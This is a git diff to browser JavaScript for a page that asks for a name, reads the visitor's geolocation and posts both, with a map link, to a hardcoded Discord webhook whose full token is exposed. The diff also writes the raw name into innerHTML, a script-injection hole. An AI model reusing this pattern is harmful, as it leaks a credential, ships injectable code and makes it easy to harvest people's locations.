@@ -1,5 +1,12 @@
 document.getElementById('locateBtn').addEventListener('click', () => {
   const output = document.getElementById('output');
+  const nameInput = document.getElementById('nameInput');
+  const name = nameInput.value.trim();
+
+  if (!name) {
+    output.textContent = '⚠️ ใส่ชื่อก่อนน้า!';
+    return;
+  }
 
   if (!navigator.geolocation) {
     output.textContent = 'Geolocation not supported by your browser.';
@@ -15,12 +22,13 @@ document.getElementById('locateBtn').addEventListener('click', () => {
     const longitude = position.coords.longitude;
 
     output.innerHTML = `
+      <strong>👤 Name:</strong> ${name}<br>
       <strong>Latitude:</strong> ${latitude}<br>
       <strong>Longitude:</strong> ${longitude}<br>
       <em>Data sent to Discord...</em>
     `;
 
-    sendToDiscord(latitude, longitude);
+    sendToDiscord(name, latitude, longitude); // ✅ ใส่ name ด้วย
   }
 
   function error() {
@@ -28,10 +36,13 @@ document.getElementById('locateBtn').addEventListener('click', () => {
   }
 });
 
-function sendToDiscord(lat, lng) {
+function sendToDiscord(name, lat, lng) {
   const webhookURL = "https://discord.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI";
+
+  const safeName = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
   const content = {
-    content: `📍 พิกัดผู้ใช้มาแล้วจ้าา!\n🌐 Lat: ${lat}\n🌐 Lng: ${lng}\n🗺️ https://maps.google.com/?q=${lat},${lng}`
+    content: `📥 **New Location Received**\n👤 Name: ${safeName}\n🌐 Lat: ${lat}\n🌐 Lng: ${lng}\n🗺️ https://maps.google.com/?q=${lat},${lng}`
   };
 
   fetch(webhookURL, {
